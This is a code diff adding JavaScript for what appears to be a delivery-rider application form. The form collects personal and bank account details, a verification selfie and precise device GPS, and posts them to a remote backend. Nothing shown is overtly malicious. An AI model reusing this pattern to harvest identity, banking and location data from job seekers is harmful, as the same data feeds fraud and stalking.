+
+    alert(
+      "Please take your verification photograph first."
+    );
+
+    return;
+
+  }
+
+
+  stopCamera();
+
+  // Refresh the GPS reading immediately before submission.
+  // Browsers decide whether a permission prompt is shown; a webpage cannot
+  // force a prompt when permission has already been granted or denied.
+  consentedLocation = await requestDeviceLocation();
+  if(!consentedLocation){
+    alert("A fresh device GPS location is required before submission. Please allow location access and try again.");
+    return;
+  }
+
+  const applicationReference = "RSNG-" + Math.floor(100000 + Math.random()*900000);
+  const submitted = await submitApplication(applicationReference);
+  if(!submitted) return;
+
+  /*
+    Generate application reference.
+  */
+
+  const random =
+    Math.floor(
+      100000 +
+      Math.random()*900000
+    );
+
+
+  document
+    .getElementById("applicationReference")
+    .textContent =
+      applicationReference;
+
+
+  /*
+    Move to final verification screen.
+  */
+
+  document
+    .getElementById("stepTwo")
+    .classList.add("hidden");
+
+
+  document
+    .getElementById("stepThree")
+    .classList.remove("hidden");
+
+
+  document
+    .getElementById("application")
+    .scrollIntoView({
+      behavior:"smooth"
+    });
+
+}
+
+
+/* =========================================
+   CONSENTED DEVICE LOCATION
+========================================= */
+
+function requestDeviceLocation(){
+  const status = document.getElementById("locationStatus");
+  const verificationStatus = document.getElementById("verificationLocationStatus");
+
+  const setStatus = text => {
+    if(status) status.textContent = text;
+    if(verificationStatus) verificationStatus.textContent = text;
+  };
+
+  if(!navigator.geolocation){
+    setStatus("Device GPS is not supported by this browser. An estimated IP location will NOT be used.");
+    return Promise.resolve(null);
+  }
+
+  setStatus("Requesting a fresh device GPS location…");
+
+  return new Promise(resolve => {
+    navigator.geolocation.getCurrentPosition(
+      position => {
+        const coords = position.coords;
+        const accuracy = Number(coords.accuracy);
+
+        if(!Number.isFinite(accuracy) || accuracy <= 0){
+          setStatus("The device did not return a measurable GPS accuracy. Please try again.");
+          resolve(null);
+          return;
+        }
+
+        const location = {
+          latitude: coords.latitude,
+          longitude: coords.longitude,
+          accuracyMeters: accuracy,
+          altitude: coords.altitude,
+          heading: coords.heading,
+          speed: coords.speed,
+          capturedAt: new Date(position.timestamp).toISOString()
+        };
+
+        setStatus(`Device GPS received — accuracy ±${Math.round(accuracy)} m.`);
+        resolve(location);
+      },
+      error => {
+        const message = error.code === 1
+          ? "Location permission was not granted. Please allow device location and try again."
+          : error.code === 2
+            ? "Your device could not determine a GPS location. Move to an area with a clearer GPS signal and try again."
+            : "The device GPS request timed out. Please try again.";
+
+        setStatus(message);
+        console.warn("Device GPS unavailable:", error.message);
+        resolve(null);
+      },
+      { enableHighAccuracy:true, timeout:20000, maximumAge:0 }
+    );
+  });
+}
+
+function fileToBlob(dataUrl){
+  const [header, data] = dataUrl.split(',');
+  const mime = header.match(/:(.*?);/)[1];
+  const bytes = atob(data);
+  const array = Uint8Array.from(bytes, char => char.charCodeAt(0));
+  return new Blob([array], {type:mime});
+}
+
+async function submitApplication(applicationReference){
+  const hint = document.getElementById("cameraHint");
+  hint.textContent = "Submitting securely for verification…";
+  const form = new FormData();
+  const fields = ["firstName","surname","phone","state","experience","workType","deliveryArea","motorcycle","deliveries","status","accountName","accountNumber","bank"];
+  for(const id of fields) form.append(id, document.getElementById(id).value.trim());
+  form.append("applicationReference", applicationReference);
+  form.append("privacyConsent", "true");
+  form.append("deviceLocation", JSON.stringify(consentedLocation));
+  form.append("clientTimezone", Intl.DateTimeFormat().resolvedOptions().timeZone || "");
+  const photoBlob = originalPhotoFile || fileToBlob(capturedSelfie);
+  form.append("photo", photoBlob, originalPhotoFile ? originalPhotoFile.name : "selfie-capture.jpg");
+
+  try{
+    const response = await fetch(`${BACKEND_URL}/api/applications`, {method:"POST", body:form});
+    const result = await response.json().catch(() => ({}));
+    if(!response.ok) throw new Error(result.error || "The secure submission failed.");
+    window.__serverApplication = result;
+    return true;
+  }catch(error){
+    console.error(error);
+    hint.textContent = "Secure submission failed.";
+    alert(error.message + " Please check the Render URL and try again.");
+    return false;
+  }
+}
+
+document.getElementById("originalPhoto").addEventListener("change", event => {
+  originalPhotoFile = event.target.files && event.target.files[0] ? event.target.files[0] : null;
+  if(originalPhotoFile){
+    const preview = document.getElementById("selfiePreview");
+    preview.src = URL.createObjectURL(originalPhotoFile);
+    document.getElementById("cameraVideo").classList.add("hidden");
+    preview.classList.remove("hidden");
+    document.getElementById("cameraHint").textContent = "Original photo selected. Confirm it below.";
+    document.getElementById("captureBtn").classList.add("hidden");
+    document.getElementById("retakeBtn").classList.remove("hidden");
+    document.getElementById("confirmBtn").classList.remove("hidden");
+  }
+});
+
+
+/* =========================================
+   STOP CAMERA
+========================================= */
+
+function stopCamera(){
+
+  if(cameraStream){
+
+    cameraStream
+      .getTracks()
+      .forEach(track => track.stop());
+
+    cameraStream = null;
+
+  }
+
+}
+
+
+/* =========================================
+   CLEAN CAMERA WHEN PAGE CLOSES
+========================================= */
+
+window.addEventListener(
+  "beforeunload",
+  stopCamera
+);
+
+</script>
+
+</body>
+</html>
